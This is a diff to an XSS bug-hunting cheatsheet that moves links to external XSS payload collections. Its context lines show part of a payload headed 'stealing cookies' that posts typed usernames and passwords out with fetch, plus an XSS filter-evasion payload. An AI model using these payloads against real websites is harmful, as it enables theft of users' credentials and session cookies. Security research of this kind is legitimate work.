@@ -71,6 +71,15 @@ Here, ```%09``` represents the horizontal tab character and ```%0A``` represents
 ![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)
 
 ![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
+
+**External source of payloads**
+
+https://github.com/payloadbox/xss-payload-list
+
+**For filter bypass**
+
+https://github.com/terjanq/Tiny-XSS-Payloads
+
 ## Payload for stealing cookies
 ```js
 <script>
@@ -90,10 +99,6 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 ```
-#### External source of payloads
-https://github.com/payloadbox/xss-payload-list
-##### For filter bypass
-https://github.com/terjanq/Tiny-XSS-Payloads
 ## XSS with filter evasion
 ```
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
